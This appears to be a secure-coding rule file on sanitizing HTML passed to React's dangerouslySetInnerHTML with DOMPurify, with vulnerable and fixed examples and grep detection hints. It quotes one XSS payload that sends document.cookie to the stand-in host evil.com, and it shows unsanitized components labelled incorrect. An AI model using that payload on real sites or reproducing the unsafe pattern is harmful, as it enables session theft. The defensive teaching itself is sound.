---
title: Sanitize Content Before dangerouslySetInnerHTML
description: "Using dangerouslySetInnerHTML with unsanitized user input enables XSS attacks. Always sanitize with DOMPurify or a trusted library."
impact: CRITICAL
impact_description: prevents cross-site scripting (XSS) attacks
tags: [security, react, xss, sanitization]
cwe: ["CWE-79"]
owasp: ["A03:2021"]
detection_grep: "dangerouslySetInnerHTML"
---

## Sanitize Content Before dangerouslySetInnerHTML

**Impact: CRITICAL (prevents cross-site scripting (XSS) attacks)**

React escapes all content rendered via JSX by default, which is a strong XSS defense. However, `dangerouslySetInnerHTML` explicitly bypasses this protection. If the HTML string originates from user input, an API response, a CMS, or any untrusted source, an attacker can inject `<script>` tags, event handlers (`onerror`, `onload`), or malicious `<iframe>` elements that execute arbitrary JavaScript in the user's browser.

**Incorrect (unsanitized user content injected directly):**

```tsx
function Comment({ body }: { body: string }) {
  // ❌ User-supplied HTML rendered without any sanitization
  return <div dangerouslySetInnerHTML={{ __html: body }} />
}

function CmsPage({ html }: { html: string }) {
  // ❌ CMS content may contain injected scripts
  return <article dangerouslySetInnerHTML={{ __html: html }} />
}
```

An attacker submitting `<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">` as a comment body steals every reader's session cookie.

**Correct (sanitize with DOMPurify before rendering):**

```tsx
import DOMPurify from 'dompurify'

function Comment({ body }: { body: string }) {
  // ✅ Sanitized — strips scripts, event handlers, and dangerous tags
  const clean = DOMPurify.sanitize(body)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

function CmsPage({ html }: { html: string }) {
  // ✅ Restrict to safe subset of HTML
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3'],
    ALLOWED_ATTR: ['href', 'title'],
  })
  return <article dangerouslySetInnerHTML={{ __html: clean }} />
}
```

**Additional context:**

- Prefer rendering structured data via JSX instead of raw HTML whenever possible.
- If you must render HTML, DOMPurify is the most battle-tested sanitization library. Alternatives include `sanitize-html` and `isomorphic-dompurify` for SSR.
- Server-side sanitization alone is not sufficient if the client later modifies the HTML. Sanitize at the point of rendering.

**Detection hints:**

```bash
# Find all uses of dangerouslySetInnerHTML
grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" --include="*.jsx"
# Check if DOMPurify is imported in those files
grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" -l | xargs grep -L "DOMPurify\|sanitize"
```

Reference: [React docs on dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
